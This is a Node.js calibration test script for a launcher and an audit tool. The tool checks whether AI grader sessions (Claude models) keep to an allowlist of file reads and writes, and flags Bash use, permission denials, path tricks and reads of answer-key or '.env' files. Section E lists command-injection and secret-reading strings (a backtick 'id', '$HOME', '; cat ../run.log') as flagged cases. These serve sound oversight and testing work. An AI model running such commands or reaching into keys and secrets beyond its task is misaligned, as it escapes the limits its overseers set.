    check('cwdprobe-1: one Read + one Write, memory ABSENT projectMemory=0 claudeMem=0, slugJsonl 1, out.txt written -> ok; the line is in grader-cwd.launches.jsonl', x.code === 0 && /cwdprobe-1 a1: session [0-9a-f-]{36} model claude-opus-5-5 exit 0 cwd cwdprobe-1-a1 slugJsonl 1 memoryDir absent memory ABSENT projectMemory=0 claudeMem=0 tools \{"Read":1,"Write":1\} out\.txt written -> ok/.test(x.out) && jl(pl).length === 1 && jl(pl)[0].slot === 'cwdprobe-1' && fs.existsSync(path.join(gdir, 'cwdprobe-1-a1', 'out.txt')), x.out.slice(-200));
    check('... the probe\'s prompt is one Read of grading\\probe-input.txt and one Write of <own cwd>\\out.txt, with the grader\'s flags and the same rule kinds (Read, Edit; point 15: no Bash, no --add-dir)', (() => { const a = calls().at(-1).args; return /Read the file .*probe-input\.txt and then write/.test(a[1]) && a[1].includes('cwdprobe-1-a1') && a.includes('dontAsk') && a[a.indexOf('--tools') + 1] === 'Read,Write,Edit' && !a.includes('--add-dir') && !a.slice(2).some((q) => /Bash/.test(q)) && a.slice(a.indexOf('--allowed-tools') + 1).length === 2 && !a.some((q) => /dangerously/.test(q)); })() && fs.readFileSync(path.join(gdir, 'probe-input.txt'), 'utf8').split('\n').filter(Boolean).length === 3);
    x = lg(['cwdprobe-1', '--probe']);
    check('cwdprobe-1 again: REFUSED (its cwd exists), exit 2', x.code === 2 && /already exists/.test(x.out));
    x = lg(['cwdprobe-2', '--probe']);
    check('cwdprobe-2 after a clean probe 1: runs from its own fresh cwd cwdprobe-2-a1, ok, second line', x.code === 0 && /cwdprobe-2 a1: .*-> ok/.test(x.out) && jl(pl).length === 2 && fs.existsSync(path.join(gdir, 'cwdprobe-2-a1', 'out.txt')));
    check('... every probe invocation (not the dry run) is appended with its command to grader-cwd.probes.out.txt', fs.existsSync(po) && (fs.readFileSync(po, 'utf8').match(/^\$ node launch-grader\.mjs /gm) ?? []).length === 4);
    // the gate answers differently when the effect is present: a probe 1 whose transcript carries a memory marker fails, and one whose first probe made no tool call blocks probe 2
    x = lg(['cwdprobe-1', '--probe'], { FAKE_MEMORY: '1', TURN_GRADING_DIR: path.join(tmp, 'grading-D2'), FQ_OUT_DIR: path.join(tmp, 'R-D2') });
    check('a probe 1 whose transcript carries a memory marker -> FAILED (exit 1, memory LOADED printed, the transcript is kept)', x.code === 1 && /memory LOADED/.test(x.out) && /FAILED/.test(x.out));
    x = lg(['cwdprobe-2', '--probe'], { TURN_GRADING_DIR: path.join(tmp, 'grading-D3'), FQ_OUT_DIR: path.join(tmp, 'R-D3') });
    check('probe 2 where no probe 1 line exists in that output folder: REFUSED', x.code === 2);
    // probe 1 recorded exit 0 but its transcript shows two Reads and no Write: probe 2 must not start (the smallest sequence that can show the carry-over needs a tool-using first session)
    const out4 = path.join(tmp, 'R-D4'); fs.mkdirSync(out4, { recursive: true }); fs.mkdirSync(path.join(projD, 'slug-bad'), { recursive: true });
    fs.writeFileSync(path.join(projD, 'slug-bad', 'sessBad.jsonl'), `${JSON.stringify({ type: 'assistant', message: { content: [{ type: 'tool_use', name: 'Read' }, { type: 'tool_use', name: 'Read' }] } })}\n`);
    fs.writeFileSync(path.join(out4, 'grader-cwd.launches.jsonl'), `${JSON.stringify({ slot: 'cwdprobe-1', attempt: 1, session_id: 'sessBad', model: 'claude-opus-5-5', exit: 0, cwd: 'x', startedAt: 'a', endedAt: 'b', slugJsonl: 1, memoryDir: 'absent' })}\n`);
    x = lg(['cwdprobe-2', '--probe'], { TURN_GRADING_DIR: path.join(tmp, 'grading-D4'), FQ_OUT_DIR: out4 });
    check('probe 2 where probe 1 recorded exit 0 but its transcript shows Read x2 and no Write: REFUSED (exit 2, nothing launched)', x.code === 2 && /REFUSED -- the second probe starts only after/.test(x.out) && !fs.existsSync(path.join(tmp, 'grading-D4', 'cwdprobe-2-a1')));
    check('the real folder F\\grading was not touched by any of this', gradingSnap() === gradingBefore);
}
//@@END-SECTION-D@@

// ───────────────────────── E. audit-graders.mjs: A2 point 13 (the pilot grader's absolute path of its OWN file) ─────────────────────────
// Evidence: the pilot grader (session 6441d4bf, cwd = the fresh per-attempt folder of point 9) validated its verdicts with
//   node -e "<code>" "<absolute C:\ path of its own verdicts file>"      -- no cd, backslashes in the argument
// and points 1/10 as first built FLAGGED it (the argument regex had no backslash, the folder is not the cwd). Run alone with
//   node grader-session-calibrate.mjs --only E     (-> R/audit-graders.point13.out.txt)
if (want('E')) {
    console.log('\n=== E. audit-graders.mjs: A2 point 13 (own-file argument in any of C:\\.. / C:/.. / /c/.., with or without the cd) ===');
    const FT = path.dirname(R);
    const MAINDIR = 'C:/Users/sotka/OneDrive/Masaüstü/natively-cluely-ai-assistant';
    const RUBRIC = `${MAINDIR}/electron/test/golden/interview60.grader-prompt.md`;
    const DISPATCH = path.join(path.dirname(FT), 'validation-hour/h40d-grader-dispatch.txt');
    const B = 'C:/x/blind', XR = 'C:/x/rubric.md';
    const baseArgs = ['--blind-dir', B, '--rubric', XR, '--no-dispatch-check', '--allow-validation-bash'];
    const au = (calls) => {
        const f = path.join(tmp, `p13-${Math.random().toString(36).slice(2)}.jsonl`);
        writeJsonl(f, [assistant('claude-opus-5-5', [tool('Read', { file_path: XR }), tool('Read', { file_path: `${B}/pairs.blind-1.json` }), tool('Write', { file_path: `${B}/verdicts.blind-1.g1.json`, content: '{}' }), ...calls])]);
        const r = cli('audit-graders.mjs', [...baseArgs, `blind-1.g1=file:${f}`]);
        return { ...r, line: r.out.split('\n').find((l) => l.startsWith('blind-1.g1')) ?? '' };
    };
    const bash = (cmd) => tool('Bash', { command: cmd });
    const flagged = (r) => r.code === 1 && /FLAGGED/.test(r.line);
    const clean = (r) => r.code === 0 && / clean/.test(r.line) && !/FLAGGED/.test(r.line);
    const show = (r) => r.line.replace(/^.*?FLAGGED \d+: /, '').slice(0, 100);
    // the pilot's code verbatim; only the arguments / the cd vary (point 10's <code> rule is unchanged by point 13)
    const PILOT_CODE = "const o=JSON.parse(require('fs').readFileSync(process.argv[1],'utf8'));console.log(Object.keys(o).length)";
    const node = (...args) => `node -e "${PILOT_CODE}"${args.map((a) => ` ${a}`).join('')}`;
    const Q = (p) => `"${p}"`;
    const OWNV = 'C:\\x\\blind\\verdicts.blind-1.g1.json';

    // ── the real pilot transcript (session 6441d4bf, synthetic folder F\pilot-blind): clean, ABSENT/PINNED are checked by the other tools ──
    const pilot = cli('audit-graders.mjs', ['--allow-validation-bash', '--blind-dir', path.join(FT, 'pilot-blind'), '--rubric', RUBRIC, '--dispatch', DISPATCH, '--projects', PROJECTS, 'blind-1.g1=session:6441d4bf-d00c-4007-871e-b7dc480b2cab']);
    console.log(pilot.out.split('\n').filter((l) => /^(blind-|AUDIT)/.test(l)).map((l) => `     ${l}`).join('\n'));
    check('THE REAL PILOT TRANSCRIPT 6441d4bf (its one Bash: absolute own-verdicts path, no cd) reads CLEAN, bash=[360:b271cca9e127], dispatch=match, exit 0', pilot.code === 0 && /\(6441d4bf[^)]*\): 4 tool inputs \[Readx2 Writex1 Bashx1\]; clean; bash=\[360:b271cca9e127\]; dispatch=match/.test(pilot.out), pilot.out.split('\n')[0].slice(0, 100));

    // ── the same command with its argument replaced: each FLAGGED (the brief's (a)-(f)) ──
    let r;
    const flaggedCases = [
        ['(a) another grader\'s verdicts file in the same blind folder', node(Q('C:\\x\\blind\\verdicts.blind-1.g2.json'))],
        ['(b) a keyhold\\key file', node(Q('C:\\x\\keyhold\\key.blind-1.json'))],
        ['(c) an R\\interview60.answers.* file', node(Q('C:\\x\\R\\interview60.answers.gemini-3.5-flash-lite_fturn-s50m-A-r1.json'))],
        ['(d) MAIN\\.env', node(Q(`${MAINDIR}/.env`))],
        ['(e) a .. path that resolves to its OWN file', node(Q('C:\\x\\blind\\..\\blind\\verdicts.blind-1.g1.json'))],
        ['(f) a glob verdicts.*.json (quoted, absolute)', node(Q('C:\\x\\blind\\verdicts.*.json'))],
        ['(f) the same glob, bare and relative', node('verdicts.*.json')],
        ['(f) verdicts.blind-1.g?.json', node(Q('C:\\x\\blind\\verdicts.blind-1.g?.json'))],
        ['(f) verdicts.blind-1.g[12].json', node(Q('C:\\x\\blind\\verdicts.blind-1.g[12].json'))],
        ['the wrong cd: cd "<another folder>" && ... "<own verdicts>"', `cd "C:\\x\\other" && ${node(Q(OWNV))}`],
        ['a cd with a .. that resolves to the own folder', `cd "C:\\x\\blind\\..\\blind" && ${node(Q(OWNV))}`],
        ['the own file name in ANOTHER folder (C:\\x\\blind2\\verdicts.blind-1.g1.json)', node(Q('C:\\x\\blind2\\verdicts.blind-1.g1.json'))],
        ['the own file name on ANOTHER drive (D:\\x\\blind\\...)', node(Q('D:\\x\\blind\\verdicts.blind-1.g1.json'))],
        ['the rubric (a Read-allowed file, but not an argument-allowed one)', node(Q(XR))],
        ['a ~ path', node(Q('~/verdicts.blind-1.g1.json'))],
        ['a ~ anywhere in an argument (~/..../verdicts.blind-1.g1.json)', node(Q('~/x/verdicts.blind-1.g1.json'))],
        ['a ~ inside an otherwise-own absolute argument', node(Q('C:\\x\\blind~1\\verdicts.blind-1.g1.json'))],
        ['NO cd, a RELATIVE argument naming the own verdicts (it would resolve against the empty attempt cwd), quoted', node(Q('verdicts.blind-1.g1.json'))],
        ['NO cd, a RELATIVE bare ./verdicts.blind-1.g1.json', node('./verdicts.blind-1.g1.json')],
        ['NO cd, the own-file-name LITERAL inside the code', `node -e "console.log(Object.keys(JSON.parse(require('fs').readFileSync('verdicts.blind-1.g1.json','utf8'))).length)"`],
        ['a drive-relative argument (C:verdicts.blind-1.g1.json)', node(Q('C:verdicts.blind-1.g1.json'))],
        ['a rooted argument without a drive (\\x\\blind\\verdicts.blind-1.g1.json)', node(Q('\\x\\blind\\verdicts.blind-1.g1.json'))],
        ['fs.readFileSync(process.argv[0]) (the node binary) with the own verdicts as the ONLY argument', `node -e "console.log(require('fs').readFileSync(process.argv[0],'utf8').length)" ${Q(OWNV)}`],
        ['fs.readFileSync(process.argv[2]) with ONE argument (an index past the last argument)', `node -e "console.log(require('fs').readFileSync(process.argv[2],'utf8').length)" ${Q(OWNV)}`],
        ['cd "<own folder>" && fs.readFileSync(process.argv[3]) with two arguments', `cd "C:/x/blind" && node -e "console.log(require('fs').readFileSync(process.argv[3],'utf8').length)" ${Q(OWNV)} ${Q('C:\\x\\blind\\pairs.blind-1.json')}`],
        ['/c/.. form with a .. segment', node(Q('/c/x/blind/../blind/verdicts.blind-1.g1.json'))],
        ['a bare argument with a backslash (the shell eats it; `.\\.` would become `..`)', node(`C:/x/blind/.\\./verdicts.blind-1.g1.json`)],
        ['a bare absolute C:\\ path (the shell would eat the backslashes)', node(OWNV)],
        ['a $ in the argument', node(Q('C:\\x\\blind\\$HOME'))],
        ['a backtick in the argument', node('"C:\\x\\blind\\`id`"')],
        ['a second argument that is not an own file', node(Q(OWNV), Q('C:\\x\\blind\\verdicts.blind-1.g2.json'))],
        ['the own file followed by ; cat ../run.log', `${node(Q(OWNV))} ; cat ../run.log`],
        ['the own file followed by && cat', `${node(Q(OWNV))} && cat ../run.log`],
        ['the own file as the argument but a banned token in the code (point 10 unchanged)', `node -e "process.chdir('..');console.log(1)" ${Q(OWNV)}`],
        ['process.argv[2] with a single argument (point 10 unchanged)', `node -e "console.log(require('fs').readFileSync(process.argv[2],'utf8').length)" ${Q(OWNV)}`],
    ];
    for (const [name, cmd] of flaggedCases) { r = au([bash(cmd)]); check(`point 13 NEGATIVE: ${name}: FLAGGED`, flagged(r), show(r)); }

    // ── the own-file argument in every admitted spelling: clean ──
    const cleanCases = [
        ['quoted C:\\ path, no cd (the pilot\'s shape)', node(Q(OWNV))],
        ['quoted C:/ path, no cd', node(Q('C:/x/blind/verdicts.blind-1.g1.json'))],
        ['quoted /c/ path, no cd', node(Q('/c/x/blind/verdicts.blind-1.g1.json'))],
        ['bare /c/ path', node('/c/x/blind/verdicts.blind-1.g1.json')],
        ['bare C:/ path', node('C:/x/blind/verdicts.blind-1.g1.json')],
        ['upper-case /C/X/BLIND/VERDICTS.blind-1.g1.JSON (case-insensitive)', node(Q('/C/X/BLIND/VERDICTS.blind-1.g1.JSON'))],
        ['cd "<own folder>" && ... quoted relative name', `cd "C:/x/blind" && ${node(Q('verdicts.blind-1.g1.json'))}`],
        ['cd "<own folder>" && ... bare relative ./verdicts.blind-1.g1.json', `cd "C:/x/blind" && ${node('./verdicts.blind-1.g1.json')}`],
        ['cd "<own folder>" && the own-file-name literal in the code (the form of 5 of the 8 design-2 graders)', `cd "C:/x/blind" && node -e "console.log(Object.keys(JSON.parse(require('fs').readFileSync('verdicts.blind-1.g1.json','utf8'))).length)"`],
        ['the own PAIRS file by absolute C:\\ path', node(Q('C:\\x\\blind\\pairs.blind-1.json'))],
        ['cd "<own folder, C:\\ spelling>" && ... "<own verdicts, C:\\ spelling>"', `cd "C:\\x\\blind" && ${node(Q(OWNV))}`],
        ['cd "<own folder, /c/ spelling>" && ... bare relative', `cd "/c/x/blind" && ${node('verdicts.blind-1.g1.json')}`],
        ['two own arguments (verdicts and pairs) with process.argv[1] and [2]', `node -e "const a=JSON.parse(require('fs').readFileSync(process.argv[1],'utf8'));const b=JSON.parse(require('fs').readFileSync(process.argv[2],'utf8'));console.log(Object.keys(a).length,b.items.length)" ${Q(OWNV)} ${Q('C:\\x\\blind\\pairs.blind-1.json')}`],
    ];
    for (const [name, cmd] of cleanCases) { r = au([bash(cmd)]); check(`point 13 POSITIVE: ${name}: clean`, clean(r), show(r)); }
    r = au([bash(node(Q(OWNV)))]); check('... the clean line records <length>:<sha12> of the command', clean(r) && /bash=\[\d+:[0-9a-f]{12}\]/.test(r.line));

    // ── the 8 real design-2 s50l transcripts stay clean ──
    const real = ['blind-1.g1=addb84e6bd55778d5', 'blind-1.g2=a681f259dff0dae30', 'blind-2.g1=a5eb230f8d7cb101a', 'blind-2.g2=ab34ebe95114932db', 'blind-3.g1=a83e3007ff2d0bc45', 'blind-3.g2=ab605c210a849d667', 'blind-4.g1=aa08ae8c058eb8aa9', 'blind-4.g2=aa85ea6faa528f27c'];
    r = cli('audit-graders.mjs', ['--allow-validation-bash', '--blind-dir', path.join(path.dirname(FT), 'followup-questions-s50l', 'blind'), '--rubric', RUBRIC, '--dispatch', DISPATCH, '--session', SESSION, ...real]);
    console.log(r.out.split('\n').filter((l) => /^(blind-|AUDIT)/.test(l)).map((l) => `     ${l}`).join('\n'));
    check('the 8 real design-2 s50l transcripts still read clean (8 of 8, dispatch=match 8/8, exit 0)', r.code === 0 && (r.out.match(/\): \d+ tool inputs \[[^\]]*\]; clean;/g) ?? []).length === 8 && (r.out.match(/dispatch=match/g) ?? []).length === 8 && /AUDIT: all graders clean/.test(r.out));
}

// ───────────────────────── F. audit-graders.mjs DEFAULT mode: A2 point 15 (graders have no Bash and no --add-dir) ─────────────────────────
// Rule (A2-POINT15-BRIEF.md): the audit WITHOUT --allow-validation-bash is the registration's original Read/Write rule. A grader is clean iff every tool call is
//   Read of the own pairs file, the rubric/instruction file or the own verdicts file; Write/Edit of the own verdicts file. Any Bash, any other tool, any mcp__*,
//   any call that Claude Code DENIED (a tool_result with is_error and a permission/denied message, a toolDenialKind, a permission_denials list) FLAGS.
// Real transcripts: the point-15 spike (8a49290e: --tools Read,Write,Edit, no --add-dir) must read CLEAN; the negative probe (f8d13b32: a Read outside the cwd that
// no allow rule names, DENIED by Claude Code) must read FLAGGED; the eight design-2 s50l graders and the pilot (all used Bash) are a HISTORICAL shape, flagged by
// design under point 15. Run alone with   node grader-session-calibrate.mjs --only F   (-> R/audit-graders.point15.out.txt)
if (want('F')) {
    console.log('\n=== F. audit-graders.mjs DEFAULT mode: A2 point 15 (no Bash, no --add-dir; denials flag) ===');
    const FT = path.dirname(R);
    const MAINDIR = 'C:/Users/sotka/OneDrive/Masaüstü/natively-cluely-ai-assistant';
    const RUBRIC = `${MAINDIR}/electron/test/golden/interview60.grader-prompt.md`;
    const DISPATCH = path.join(path.dirname(FT), 'validation-hour/h40d-grader-dispatch.txt');
    const B = 'C:/x/blind', XR = 'C:/x/rubric.md';
    const OWNP = `${B}/pairs.blind-1.json`, OWNV = `${B}/verdicts.blind-1.g1.json`;
    const baseArgs = ['--blind-dir', B, '--rubric', XR, '--no-dispatch-check'];          // NOTE: never --allow-validation-bash here
    const au = (calls, results = [], tag = 'blind-1.g1') => {
        const f = path.join(tmp, `p15-${Math.random().toString(36).slice(2)}.jsonl`);
        writeJsonl(f, [assistant('claude-opus-5-5', calls), ...results]);
        const r = cli('audit-graders.mjs', [...baseArgs, `${tag}=file:${f}`]);
        return { ...r, line: r.out.split('\n').find((l) => l.startsWith(tag)) ?? '' };
    };
    const own4 = [tool('Read', { file_path: XR }), tool('Read', { file_path: OWNP }), tool('Write', { file_path: OWNV, content: '{}' }), tool('Read', { file_path: OWNV })];
    const resultRec = (text, extra = {}, isError = true) => rec({ type: 'user', ...extra, message: { role: 'user', content: [{ type: 'tool_result', tool_use_id: 't', is_error: isError, content: text }] } });
    const DENIED = "Permission to use Read has been denied because Claude Code is running in don't ask mode.";
    const flagged = (r, why) => r.code === 1 && /FLAGGED/.test(r.line) && (!why || why.test(r.line));
    const clean = (r) => r.code === 0 && / clean/.test(r.line) && !/FLAGGED/.test(r.line);
    const show = (r) => r.line.replace(/^.*?FLAGGED \d+: /, '').slice(0, 100);
    let r;

    // ── clean shapes ──
    r = au(own4); check('point 15 POSITIVE: Read rubric + own pairs, Write own verdicts, Read own verdicts (the spike shape): clean, exit 0', clean(r) && /\[Readx3 Writex1\]/.test(r.line) && /bash=\[\]/.test(r.line), r.line.slice(0, 130));
    r = au([tool('Read', { file_path: XR }), tool('Read', { file_path: OWNP }), tool('Edit', { file_path: OWNV, old_string: 'a', new_string: 'b' })]); check('point 15 POSITIVE: Edit of the own verdicts file counts as Write: clean', clean(r), r.line.slice(0, 130));
    r = au([tool('Read', { file_path: OWNV })]); check('point 15 POSITIVE: a Read of the OWN verdicts file alone: clean', clean(r), show(r));
    r = au([tool('Read', { file_path: 'C:\\x\\blind\\pairs.blind-1.json' })]); check('point 15 POSITIVE: the same own pairs file spelled with backslashes: clean', clean(r), show(r));

    // ── Bash: any Bash flags (the shapes points 1 / 10 / 13 used to allow, and plain ones) ──
    r = au([...own4, tool('Bash', { command: `cd "${B}" && node -e "console.log(Object.keys(JSON.parse(require('fs').readFileSync('verdicts.blind-1.g1.json','utf8'))).length)"` })]); check('point 15 NEGATIVE: the exact shape of the old allowed validation Bash (cd + node -e, own file only): FLAGGED', flagged(r, /Bash call/), show(r));
    r = au([...own4, tool('Bash', { command: 'ls' })]); check('point 15 NEGATIVE: Bash `ls`: FLAGGED', flagged(r, /Bash call/), show(r));
    r = au([...own4, tool('Bash', { command: `cat "${OWNV}"` })]); check('point 15 NEGATIVE: Bash `cat <own verdicts>`: FLAGGED (any Bash, whatever it names)', flagged(r, /Bash call/), show(r));

    // ── Read / Write outside the allowlist ──
    r = au([...own4, tool('Read', { file_path: `${B}/verdicts.blind-1.g2.json` })]); check('point 15 NEGATIVE: Read of ANOTHER grader\'s verdicts file: FLAGGED', flagged(r, /Read outside the allowlist/), show(r));
    r = au([...own4, tool('Read', { file_path: 'C:/x/keyhold/key.blind-1.json' })]); check('point 15 NEGATIVE: Read of a keyhold file: FLAGGED', flagged(r, /Read outside the allowlist/), show(r));
    r = au([...own4, tool('Read', { file_path: 'C:/x/R/interview60.answers.gemini-3.5-flash-lite_front.json' })]); check('point 15 NEGATIVE: Read of an answers file: FLAGGED', flagged(r, /Read outside the allowlist/), show(r));
    r = au([...own4, tool('Read', { file_path: `${MAINDIR}/.env` })]); check('point 15 NEGATIVE: Read of MAIN\\.env: FLAGGED', flagged(r, /Read outside the allowlist/), show(r));
    r = au([...own4, tool('Read', { file_path: `${B}/pairs.blind-2.json` })]); check('point 15 NEGATIVE: Read of another blind file\'s pairs: FLAGGED', flagged(r, /Read outside the allowlist/), show(r));
    r = au([...own4, tool('Read', { file_path: `${B}/../blind/../keyhold/k.json` })]); check('point 15 NEGATIVE: Read through a .. path to a keyhold file: FLAGGED', flagged(r, /Read outside the allowlist/), show(r));
    r = au([...own4, tool('Write', { file_path: `${B}/verdicts.blind-1.g2.json`, content: '{}' })]); check('point 15 NEGATIVE: Write of another grader\'s verdicts: FLAGGED', flagged(r, /Write outside the own verdicts file/), show(r));
    r = au([...own4, tool('Edit', { file_path: `${B}/pairs.blind-1.json`, old_string: 'a', new_string: 'b' })]); check('point 15 NEGATIVE: Edit of the own PAIRS file: FLAGGED (Edit is Write: the own verdicts file only)', flagged(r, /Edit outside the own verdicts file/), show(r));
    r = au([...own4, tool('Write', { file_path: XR, content: 'x' })]); check('point 15 NEGATIVE: Write of the rubric: FLAGGED', flagged(r, /Write outside the own verdicts file/), show(r));
    r = au([...own4, tool('Grep', { pattern: 'x', path: B })]); check('point 15 NEGATIVE: Grep: FLAGGED', flagged(r, /TOOL OTHER THAN/), show(r));
    r = au([...own4, tool('Glob', { pattern: '*' })]); check('point 15 NEGATIVE: Glob: FLAGGED', flagged(r, /TOOL OTHER THAN/), show(r));
    r = au([...own4, tool('mcp__x__y', {})]); check('point 15 NEGATIVE: an mcp__ call: FLAGGED', flagged(r, /MCP CALL/), show(r));
    r = au(own4, [], 'blind-1.g2'); check('point 15 NEGATIVE: the clean blind-1.g1 shape audited AS blind-1.g2 (it wrote the other grader\'s file): FLAGGED', flagged(r), show(r));

    // ── permission denials flag, even when the denied call itself named an allowed file ──
    r = au(own4, [resultRec(DENIED, { toolDenialKind: 'dontAsk' })]); check('point 15 DENIAL: a tool_result is_error "Permission to use Read has been denied ..." with toolDenialKind on an ALLOWED file: FLAGGED as a denial', flagged(r, /DENIED/), show(r));
    r = au(own4, [resultRec(DENIED)]); check('point 15 DENIAL: the same error text without toolDenialKind: FLAGGED', flagged(r, /DENIED/), show(r));
    r = au(own4, [resultRec('anything', { toolDenialKind: 'dontAsk' })]); check('point 15 DENIAL: toolDenialKind on an is_error result with unrelated text: FLAGGED', flagged(r, /DENIED/), show(r));
    r = au(own4, [rec({ type: 'user', message: { role: 'user', content: [{ type: 'tool_result', tool_use_id: 't', is_error: true, content: [{ type: 'text', text: 'Permission to use Write has been denied.' }] }] } })]); check('point 15 DENIAL: the message as a text-block array: FLAGGED', flagged(r, /DENIED/), show(r));
    r = au(own4, [rec({ type: 'result', permission_denials: [{ tool_name: 'Read', tool_use_id: 't' }] })]); check('point 15 DENIAL: a non-empty permission_denials list in the transcript: FLAGGED', flagged(r, /DENIED/), show(r));
    r = au(own4, [resultRec('File does not exist.')]); check('discrimination: an is_error result that is NOT a permission message (file does not exist) is NOT a denial: clean', clean(r), show(r));
    r = au(own4, [resultRec('Permission to use Read has been denied (quoted in a result)', {}, false)]); check('discrimination: the words permission / denied in a result that is NOT an error (is_error false) do not flag: clean', clean(r), show(r));
    r = au(own4, [rec({ type: 'result', permission_denials: [] })]); check('discrimination: an EMPTY permission_denials list: clean', clean(r), show(r));

    // ── the real transcripts ──
    const REALS = path.join(FT, 'work', 'spike-noadd');
    const SPIKE = '8a49290e-d30e-4087-ac9a-933257bb1d98', NEG = 'f8d13b32-2a08-4f05-aeaf-80f1a8df1e16';
    r = cli('audit-graders.mjs', ['--blind-dir', REALS, '--rubric', RUBRIC, '--dispatch', DISPATCH, '--projects', PROJECTS, `blind-1.g1=session:${SPIKE}`]);
    console.log(r.out.split('\n').filter((l) => /^(blind-|AUDIT)/.test(l)).map((l) => `     ${l}`).join('\n'));
    check(`THE REAL POINT-15 SPIKE ${SPIKE.slice(0, 8)} (--tools Read,Write,Edit, no --add-dir: Read x3, Write x1) reads CLEAN under the default mode, exit 0, bash=[], dispatch=match`, r.code === 0 && /\(8a49290e[^)]*\): 4 tool inputs \[Readx3 Writex1\]; clean; bash=\[\]; dispatch=match/.test(r.out), r.out.split('\n')[0].slice(0, 150));
    r = cli('audit-graders.mjs', ['--blind-dir', REALS, '--rubric', RUBRIC, '--no-dispatch-check', '--projects', PROJECTS, `blind-1.g1=session:${NEG}`]);
    console.log(r.out.split('\n').filter((l) => /^(blind-|AUDIT)/.test(l)).map((l) => `     ${l}`).join('\n'));
    check(`THE REAL NEGATIVE PROBE ${NEG.slice(0, 8)} (a Read outside the cwd that no allow rule names, DENIED by Claude Code) reads FLAGGED: the Read is outside the allowlist AND the denial is seen`, r.code === 1 && /\(f8d13b32[^)]*\): 1 tool inputs \[Readx1\]; FLAGGED 2:/.test(r.out) && /Read outside the allowlist/.test(r.out) && /DENIED/.test(r.out), show({ line: r.out.split('\n')[0] }));
    // the denial rule on its own, on the real record: the same transcript with the denied Read's path rewritten to the (allowed) own pairs file still flags, by the denial alone
    const negText = fs.readFileSync(path.join(PROJECTS, fs.readdirSync(PROJECTS).find((d) => fs.existsSync(path.join(PROJECTS, d, `${NEG}.jsonl`))), `${NEG}.jsonl`), 'utf8');
    const rewritten = negText.split('\n').map((l) => { if (!l.includes('"tool_use"')) return l; const j = JSON.parse(l); for (const c of j.message?.content ?? []) if (c?.type === 'tool_use' && c.input?.file_path) c.input.file_path = `${REALS}/pairs.blind-1.json`; return JSON.stringify(j); }).join('\n');
    const rf = path.join(tmp, 'neg-rewritten.jsonl'); fs.writeFileSync(rf, rewritten);
    r = cli('audit-graders.mjs', ['--blind-dir', REALS, '--rubric', RUBRIC, '--no-dispatch-check', `blind-1.g1=file:${rf}`]);
    check('... and with that Read\'s path rewritten to the ALLOWED own pairs file the real transcript still reads FLAGGED, by the denial alone (the denial rule is independent of the path rule)', r.code === 1 && /FLAGGED 1: .*DENIED/.test(r.out) && !/Read outside the allowlist/.test(r.out), r.out.split('\n')[0].slice(0, 150));
    const real = ['blind-1.g1=addb84e6bd55778d5', 'blind-1.g2=a681f259dff0dae30', 'blind-2.g1=a5eb230f8d7cb101a', 'blind-2.g2=ab34ebe95114932db', 'blind-3.g1=a83e3007ff2d0bc45', 'blind-3.g2=ab605c210a849d667', 'blind-4.g1=aa08ae8c058eb8aa9', 'blind-4.g2=aa85ea6faa528f27c'];
    r = cli('audit-graders.mjs', ['--blind-dir', path.join(path.dirname(FT), 'followup-questions-s50l', 'blind'), '--rubric', RUBRIC, '--dispatch', DISPATCH, '--session', SESSION, ...real]);
    console.log(r.out.split('\n').filter((l) => /^(blind-|AUDIT)/.test(l)).map((l) => `     ${l.slice(0, 190)}`).join('\n'));
    check('the 8 real design-2 s50l transcripts (historical shape: each ran one Bash) read FLAGGED under the default mode, 8 of 8, by design under point 15 (dispatch=match 8/8, exit 1)', r.code === 1 && (r.out.match(/\): \d+ tool inputs \[Readx2 Writex1 Bashx1\]; FLAGGED 1: Bash call/g) ?? []).length === 8 && (r.out.match(/dispatch=match/g) ?? []).length === 8, `${(r.out.match(/FLAGGED 1: Bash call/g) ?? []).length} of 8`);
    r = cli('audit-graders.mjs', ['--blind-dir', path.join(FT, 'pilot-blind'), '--rubric', RUBRIC, '--dispatch', DISPATCH, '--projects', PROJECTS, 'blind-1.g1=session:6441d4bf-d00c-4007-871e-b7dc480b2cab']);
    check('the pre-point-15 pilot transcript 6441d4bf (one Bash) reads FLAGGED under the default mode (historical shape, flagged by design)', r.code === 1 && /Bashx1\]; FLAGGED 1: Bash call/.test(r.out));

    // ── nothing on the controller path uses the withdrawn flag or a Bash shape ──
    const dayPath = ['day-pre.mjs', 'day-steps.mjs', 'legs-decide.mjs', 'launch-grader.mjs', 'scripts/e2e-synthetic.mjs', 'scripts/runner-selftest.mjs', 'scripts/mutate-decide.mjs', 'scripts/legs-decide-calibrate.mjs', 'scripts/followup-turn-run.mjs', 'scripts/followup-turn-blind.mjs', 'scripts/common.mjs'];
    const withFlag = dayPath.filter((f) => /allow-validation-bash|allowValidationBash/.test(fs.readFileSync(path.join(R, f), 'utf8')));
    check('no day-path file (day-pre, day-steps, legs-decide, launch-grader, e2e-synthetic, runner-selftest, mutate-decide, legs-decide-calibrate, followup-turn-run/-blind, common) mentions --allow-validation-bash', withFlag.length === 0, withFlag.join(','));
    const withBash = dayPath.filter((f) => /Bashx\d|Bash\(|'Bash'|--tools[^\n]*Bash/.test(fs.readFileSync(path.join(R, f), 'utf8')));
    check('... and none carries a Bash shape (a Bashx1 audit line, a Bash(...) rule, a Bash tool in --tools)', withBash.length === 0, withBash.join(','));
}

fs.rmSync(tmp, { recursive: true, force: true });
console.log(ok ? '\nGRADER-SESSION CALIBRATION OK' : '\nGRADER-SESSION CALIBRATION FAILED');
process.exit(ok ? 0 : 1);
